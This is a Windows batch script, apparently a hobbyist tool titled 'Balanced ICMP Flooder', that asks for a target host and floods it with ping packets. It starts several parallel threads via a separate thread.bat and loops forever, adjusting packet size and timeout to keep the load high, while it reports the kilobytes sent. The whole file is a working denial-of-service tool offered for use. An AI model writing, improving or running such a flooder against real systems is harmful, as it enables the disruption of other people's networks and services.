:: Programmed by hXR16F
:: hXR16F.ar@gmail.com

@echo off
mode 99,25
(echo.&echo  ______  _______        _______ __   _ _______ _______ _______     ____ _______ _______  _____ &echo  ^|_____] ^|_____^| ^|      ^|_____^| ^| \  ^| ^|       ^|______ ^|     \       ^|   ^|       ^|  ^|  ^| ^|_____]&echo  ^|_____] ^|     ^| ^|_____ ^|     ^| ^|  \_^| ^|_____  ^|______ ^|_____/     __^|__ ^|_____  ^|  ^|  ^| ^|      &echo                       _______         _____   _____  ______  _______  ______&echo                       ^|______ ^|      ^|     ^| ^|     ^| ^|     \ ^|______ ^|_____/&echo                       ^|       ^|_____ ^|_____^| ^|_____^| ^|_____/ ^|______ ^|    \_&echo.&echo.)
set /p "host=[+] Host : " & set /p "verbose=[+] Verbose? [y/n] : "
(set packet=64 & set totalpacket=64 & set timeout=80)
for /l %%i in (1,1,4) do (start /B thread.bat "%host%" "%verbose%" "%timeout%") && (@ping localhost -n 1 > nul)
rem                ^ change this to increase number of threads, f.e.: 4 = 4 threads + 1 or 9 = 9 threads + 1
:loop
	ping %host% -n 1 -l %packet% -w %timeout% > nul && (
		set /a packet=%packet%+64
		if %timeout% geq 80 set /a timeout=%timeout%-8
	) || (
		if %packet% gtr 64 set /a packet=%packet%-64
		set /a timeout=%timeout%+8
	)
	(set /a maxpacket=%packet%*5) & (set /a totalpackettemp=%totalpackettemp%+%maxpacket%) & (set /a totalpacket=%totalpackettemp%/1024)
	rem                        ^ change this to increase number of threads, f.e.: 5 = 5 threads
	if /i "%verbose%" equ "y" echo %maxpacket% bytes sent.
	title Total : %totalpacket% kilobytes sent
	goto loop
	
